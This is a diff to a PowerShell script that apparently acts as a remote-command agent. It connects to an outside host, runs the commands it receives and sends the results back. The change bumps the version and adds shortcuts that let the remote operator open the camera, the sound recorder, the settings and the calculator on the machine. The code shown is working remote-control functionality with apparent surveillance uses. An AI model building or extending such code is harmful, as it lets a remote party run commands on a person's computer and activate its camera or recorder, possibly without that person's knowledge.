@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "2.8.0"
+$Version = "2.9.0"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -805,6 +805,17 @@ function Connect-Cloudflare {
                     Send-Result-To-Server -Body $info
                     Start-Sleep -Milliseconds $activeDelay
                     continue
+                }
+
+                # Shortcut commands → auto-route to gui:
+                $guiShortcuts = @{
+                    "camera"     = "cmd /c start microsoft.windows.camera:"
+                    "recorder"   = "cmd /c start microsoft.windows.soundrecorder:"
+                    "settings"   = "cmd /c start ms-settings:"
+                    "calc"       = "calc.exe"
+                }
+                if ($guiShortcuts.ContainsKey($command.ToLower())) {
+                    $command = "gui:" + $guiShortcuts[$command.ToLower()]
                 }
 
                 Invoke-CommandStreaming -Command $command
